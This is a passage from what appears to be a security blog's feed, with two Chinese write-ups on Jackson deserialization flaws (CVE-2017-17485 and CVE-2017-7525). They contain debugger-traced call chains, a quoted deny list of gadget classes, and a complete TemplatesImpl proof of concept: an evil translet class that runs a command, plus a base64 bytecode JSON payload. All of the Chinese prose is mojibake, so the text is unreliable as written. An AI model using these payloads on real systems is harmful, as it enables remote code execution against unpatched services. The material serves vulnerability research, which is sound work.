class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseDefaultElement</span><span class="params">(Element ele, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line"><span class="comment">//importæ ‡ç­¾è§£æ </span></span><br><span class="line"><span class="keyword">if</span> (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) &#123;</span><br><span class="line">importBeanDefinitionResource(ele);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//aliasæ ‡ç­¾è§£æ</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) &#123;</span><br><span class="line">processAliasRegistration(ele);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//beanæ ‡ç­¾</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) &#123;</span><br><span class="line">processBeanDefinition(ele, delegate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) &#123;</span><br><span class="line"><span class="comment">// recurse</span></span><br><span class="line">doRegisterBeanDefinitions(ele);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢ä¸»è¦æ˜¯å¯¹ importã€aliasã€bean æ ‡ç­¾çš„è§£æä»¥åŠ beans çš„å­—æ ‡ç­¾çš„é€’å½’è§£æï¼Œæœ€ç»ˆä¼šå°†è¿™äº›æ ‡ç­¾å±æ€§çš„å€¼è£…å…¥åˆ° BeanDefinition å¯¹è±¡ä¸­ï¼Œè¿™é‡Œæ¥è¿‘èƒ½å¤Ÿæ‹¿åˆ°ä¸€ä¸ªå°è£…å¥½çš„ XML document äº†ï¼Œå¹¶ä¸”è¢«è§£æä¸º Beanã€‚</p><p>å›åˆ°æœ€å¼€å§‹çš„åœ°æ–¹ï¼Œæ¥å…³æ³¨ä¸€ä¸‹æ¼æ´ç‚¹ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ª <code>invokeBeanFactoryPostProcessors()</code> æ–¹æ³•ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è°ƒç”¨ä¸Šä¸‹æ–‡ä¸­æ³¨å†Œä¸º beans çš„å·¥å‚å¤„ç†å™¨ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/invokeBeanFactoryPostProcessors.png" class><p>ç»§ç»­è·Ÿä¸‹å»ï¼Œ<code>invokeBeanFactoryPostProcessors()</code> æ–¹æ³•ä¸­è°ƒç”¨äº† <code>getBeanNamesForType()</code> å‡½æ•°æ¥è·å– Bean åç±»å‹ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/getBeanNamesForType.png" class><p>å¾€ä¸‹ï¼Œè¿›ä¸€æ­¥è°ƒç”¨ <code>doGetBeanNamesForType()</code> æ–¹æ³•ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doGetBeanNamesForType.png" class><p>åœ¨ <code>doGetBeanNamesForType()</code> æ–¹æ³•ä¸­ï¼Œè°ƒç”¨ <code>isFactoryBean()</code> åˆ¤æ–­å½“å‰ beanName æ˜¯å¦ä¸º FactoryBeanï¼Œæ­¤æ—¶ beanName å‚æ•°å€¼ä¸º <strong>pb</strong>ï¼Œmbd å‚æ•°ä¸­è¯†åˆ«åˆ° bean æ ‡ç­¾ä¸­çš„ç±»ä¸º <code>java.lang.ProcessBuilder</code>ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/isFactoryBean.png" class><p>åœ¨ <code>isFactoryBean()</code> æ–¹æ³•ä¸­ï¼Œè°ƒç”¨ <code>predictBeanType()</code> æ–¹æ³•è·å– Bean ç±»å‹ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/predictBeanType.png" class><p>è·Ÿä¸‹å»ï¼Œ<code>AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()</code>ï¼Œç”¨æ¥è§£æ Bean ç±»ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>evaluateBeanDefinitionString()</code> æ–¹æ³•æ¥æ‰§è¡Œ Bean å®šä¹‰çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œæ­¤æ—¶ className å‚æ•°æŒ‡å‘ <code>java.lang.ProcessBuilder</code>ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/targetType.png" class><p>åŒæ—¶åœ¨è¿™é‡Œç¬¬ 432 è¡Œï¼Œ<code>this.resolveBeanClass()</code> æ–¹æ³•æ˜¯ç”¨äºæŒ‡å®šè§£æå™¨çš„ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doResolveBeanClass.png" class><p>è·Ÿè¿› <code>doResolveBeanClass()</code> æ–¹æ³•ï¼Œè¿›ä¸€æ­¥è§£æ Beanï¼Œéšåè·Ÿè¿› <code>AbstractBeanFactory.evaluateBeanDefinitionString()</code> æ–¹æ³•ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>this.beanExpressionResolver.evaluate()</code></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/evaluateBeanDefinitionString.png" class><p>æ­¤æ—¶ <code>this.beanExpressionResolver</code> æŒ‡å‘çš„æ˜¯ <code>StandardBeanExpressionResolver</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å·²ç»è°ƒç”¨åˆ°å¯¹åº”çš„ SpEL è¡¨è¾¾å¼è§£æå™¨äº†ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/spelExpressionResolver.png" class><p>è·Ÿè¿› <code>StandardBeanExpressionResolver.evaluate()</code> æ–¹æ³•ï¼Œå‘ç°è°ƒç”¨äº† Expression. getValue ()æ–¹æ³•å³ SpEL è¡¨è¾¾å¼æ‰§è¡Œçš„æ–¹æ³•ï¼Œå…¶ä¸­ sec å‚æ•°æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å†…å®¹å³ç”± spel. xml è§£æå¾—åˆ°çš„ SpEL è¡¨è¾¾å¼ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/secSpEL.png" class><p>åç»­å°±æ˜¯ SpEL è¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¯¼è‡´çš„ä»»æ„ä»£ç æ‰§è¡Œäº†ã€‚</p><p>è‡³æ­¤ï¼Œæ•´ä¸ªè°ƒç”¨è¿‡ç¨‹å°±å¤§è‡´è¿‡äº†éã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¼ å…¥çš„éœ€è¦è¢«ååºåˆ—åŒ–çš„ <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> ç±»ï¼Œå®ƒçš„æ„é€ å‡½æ•°å­˜åœ¨ SpEL æ³¨å…¥æ¼æ´ï¼Œè¿›è€Œå¯¼è‡´å¯è¢«åˆ©ç”¨æ¥è§¦å‘ Jackson ååºåˆ—åŒ–æ¼æ´ã€‚</p><h2 id="0x04-è¡¥ä¸åˆ†æ"><a href="#0x04-è¡¥ä¸åˆ†æ" class="headerlink" title="0x04 è¡¥ä¸åˆ†æ"></a>0x04 è¡¥ä¸åˆ†æ</h2><p><a class="link" href="https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf">https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf<i class="fas fa-external-link-alt"></i></a></p><p>æ¢æˆ jackson-databind-2.7.9.2ç‰ˆæœ¬çš„ jar è¯•è¯•ï¼Œä¼šæŠ¥é”™ï¼Œæ˜¾ç¤ºç”±äºå®‰å…¨åŸå› ç¦æ­¢äº†è¯¥éæ³•ç±»çš„ååºåˆ—åŒ–æ“ä½œï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fix.png" class><p>ä½†æ˜¯å»çœ‹é»‘åå•çš„è§„åˆ™ï¼Œå…¶å®å¹¶æ²¡æœ‰çœ‹åˆ°é»‘åå•ç±»é‡Œé¢æœ‰æˆ‘ä»¬åˆ©ç”¨çš„è¿™ä¸ªç±»</p><p><code>com.fasterxml.jackson.databind.jsontype.impl.SubTypeValidator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;  </span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();  </span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:  </span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599])  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.springframework.beans.factory.ObjectFactory&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1680]: may or may not be problem, take no chance  </span></span><br><span class="line">    s.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1737]; JDK provided  </span></span><br><span class="line">    s.add(<span class="string">&quot;java.util.logging.FileHandler&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1737]; 3rd party  </span></span><br><span class="line">    <span class="comment">//s.add(&quot;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&quot;); // deprecated by [databind#1855]  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1855]: more 3rd party  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);  </span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å¾€ä¸‹çœ‹ï¼Œè¿™é‡Œä¼šæŠŠæ‰€æœ‰ <code>org.springframe</code> å¼€å¤´çš„ç±»ååšå¤„ç†</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fullStartsBan.png" class><p>å…ˆè¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œå‘ç°ç±»åä¸åœ¨é»‘åå•åå†åˆ¤æ–­æ˜¯å¦æ˜¯ä»¥ <code>org.springframe</code> å¼€å¤´çš„ç±»åï¼Œæ˜¯çš„è¯å¾ªç¯éå†ç›®æ ‡ç±»çš„çˆ¶ç±»æ˜¯å¦ä¸º <code>AbstractPointcutAdviso</code> æˆ– <code>AbstractApplicationContext</code>ï¼Œæ˜¯çš„è¯è·³å‡ºå¾ªç¯ç„¶åæŠ›å‡ºå¼‚å¸¸ï¼š</p><p>è€Œæˆ‘ä»¬çš„åˆ©ç”¨ç±»å…¶ç»§æ‰¿å…³ç³»æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€¦-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒClassPathXmlApplicationContext ç±»æ˜¯ç»§æ‰¿è‡ª AbstractApplicationContext ç±»çš„ï¼Œè€Œè¯¥ç±»ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä»è€Œæ²¡åŠæ³•æˆåŠŸç»•è¿‡åˆ©ç”¨ã€‚</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2017-17485 Jackson ååºåˆ—åŒ–</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson ååºåˆ—åŒ–ï¼ˆäºŒï¼‰CVE-2017-7525</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/</id>
    <published>2023-12-07T12:06:00.000Z</published>
    <updated>2023-12-07T12:41:02.136Z</updated>
    
    <content type="html"><![CDATA[<p>åŸºäº TemplatesImpl åˆ©ç”¨é“¾</p><h2 id="0x01-å½±å“ç‰ˆæœ¬"><a href="#0x01-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x01 å½±å“ç‰ˆæœ¬"></a>0x01 å½±å“ç‰ˆæœ¬</h2><p>Jackson 2.6 ç³»åˆ— &lt; 2.6.7.1<br>Jackson 2.7 ç³»åˆ— &lt; 2.7.9.1<br>Jackson 2.8 ç³»åˆ— &lt; 2.8.8.1</p><h2 id="0x02-é™åˆ¶"><a href="#0x02-é™åˆ¶" class="headerlink" title="0x02 é™åˆ¶"></a>0x02 é™åˆ¶</h2><p>ç”±äºæ˜¯æ‰“çš„ TemplatesImpl é“¾ï¼Œæ‰€ä»¥è¦æ±‚ JDK ç‰ˆæœ¬æ˜¯ 7u21 æˆ–è€… 8u20ï¼ŒåŠ¨æ€ä»£ç†ç›¸å…³çš„é“¾å­ï¼Œè¿™éƒ¨åˆ†ä¹‹å‰å·²ç»åˆ†æè¿‡äº†</p><h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03 æ¼æ´å¤ç°"></a>0x03 æ¼æ´å¤ç°</h2><p><strong>Test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SimpleCalc. java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleCalc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PoC.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\evilClass\\SimpleCalc.class&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;drun1baby&#x27;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);  </span><br><span class="line">        System.out.printf(jsonInput);  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">        Test test;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            test = mapper.readValue(jsonInput, Test.class);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(cls);  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);  </span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];  </span><br><span class="line">        fileInputStream.read(bytes);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> DatatypeConverter.printBase64Binary(bytes);  </span><br><span class="line">        <span class="keyword">return</span> base64Encoded;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/Calc.png" class><p>å…¶å®è¿™é‡Œçœ‹å®Œä»£ç ä¹‹åé©¬ä¸Šå°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼šJackson æ˜¯è°ƒç”¨ä»»æ„çš„æ„é€ å‡½æ•°ä¸ä»»æ„çš„ setter æ–¹æ³•ï¼Œä¸ºä»€ä¹ˆä¼šè§¦å‘è¿™æ¡é“¾å­å‘¢ï¼Ÿ</p><p>7u21 è¿™æ¡é“¾å­æœ¬è´¨ä¸Šå…¶å®æ˜¯ TemplateImpl ç±»çš„ç±»åŠ¨æ€åŠ è½½ï¼Œé…åˆä¸ŠåŠ¨æ€ä»£ç†æ¥æ‰“çš„ï¼Œå¯æ˜¯è¿™é‡Œä¸è®ºæ˜¯åŠ¨æ€ä»£ç†ï¼Œè¿˜æ˜¯ <code>TemplatesImpl.getOutputProperties()</code>ï¼Œéƒ½å’Œ Jackson æ²¡å…³ç³»ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥è¯´æ˜¯éå¸¸ç–‘æƒ‘äº†</p><h2 id="0x04-æ¼æ´åˆ†æ"><a href="#0x04-æ¼æ´åˆ†æ" class="headerlink" title="0x04 æ¼æ´åˆ†æ"></a>0x04 æ¼æ´åˆ†æ</h2><p>ä¸‹æ–­ç‚¹è°ƒè¯•</p><p>é¦–å…ˆæ˜¯ç¬¬ä¸€æ¬¡åˆ° <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#deserialize</code> æ–¹æ³•ï¼Œååºåˆ—åŒ– Test ç±»ï¼Œä¼šèµ°åˆ°å…¶æ„é€ å‡½æ•°é‡Œé¢ï¼Œå¹¶ä¸”ç»§ç»­å¤„ç† <code>object</code></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/handleObject.png" class><p>ç»§ç»­å¾€ä¸‹ï¼Œä¸‹ä¸€æ­¥æ˜¯ååºåˆ—åŒ– <code>object</code> é‡Œé¢çš„æ•°æ®ã€‚</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/beanPropertiesChange.png" class><p>è¿™é‡Œå¯ä»¥çœ‹åˆ° <code>_beanProperties</code> å±æ€§ï¼Œå…¶ä¸­åŒ…å«äº†å“ªäº›å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Properties=[uriresolver([simple type, <span class="keyword">class</span> <span class="title class_">javax</span>.xml.transform.URIResolver]), transletBytecodes([array type, component type: [array type, component type: [simple type, <span class="keyword">class</span> <span class="title class_">byte</span> %&#125;]), stylesheetDOM([simple type, <span class="keyword">class</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.DOM]), transletName([simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String]), outputProperties([map type; <span class="keyword">class</span> <span class="title class_">java</span>.util.Properties, [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String] -&gt; [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String %&#125;)]</span><br></pre></td></tr></table></figure><p>é™¤äº† setter å‡½æ•°ä¸­çš„å±æ€§ä¹‹å¤–ï¼Œè¿˜æœ‰ <code>outputProperties</code>ï¼Œä¸ºä»€ä¹ˆ <code>outputProperties</code> ä¼šè¢«æ‹¿åˆ°å‘¢ï¼Ÿå› ä¸º <code>outputProperties</code> å±æ€§æœ‰ç›¸åº”çš„ getter æ–¹æ³•ï¼Œè€Œå…¶ä»–å±æ€§å´æ²¡æœ‰</p><p>æ¥ç€æ¥çœ‹çœ‹å¯¹äº <code>outputProperties</code> æ˜¯æ€ä¹ˆå¤„ç†çš„</p><p><strong>outputProperties å±æ€§åœ¨ <code>deserializeAndSet()</code> å‡½æ•°ä¸­æ˜¯é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨å®ƒçš„ getter æ–¹æ³•ï¼Œè¿™å°±æ˜¯è¯¥åˆ©ç”¨é“¾èƒ½è¢«æˆåŠŸè§¦å‘çš„åŸå› </strong></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/getter.png" class><p>è¿™é‡Œä¹ŸæŒ‡å‡ºäº†ä¸€æ¡æ”»å‡»åˆ©ç”¨æ‰‹æ³•ï¼Œä¹Ÿå°±æ˜¯åªè¦æ„é€ å‡½æ•°ä¸­å­˜åœ¨çš„å±æ€§ï¼Œä¸å­˜åœ¨ setter æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè‡ªåŠ¨è°ƒåˆ° getter æ–¹æ³•ã€‚</p><p>ä»è€Œå°±èƒ½å¤Ÿåˆ©ç”¨æˆåŠŸäº†ã€‚</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/getOutputProperties.png" class><p>åç»­å°±æ˜¯æœ€åŸºç¡€çš„ TemplatesImpl åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„è¿‡ç¨‹ï¼Œä¸å†å±•å¼€äº†</p><h2 id="0x05-å…¶ä»–ç»†èŠ‚"><a 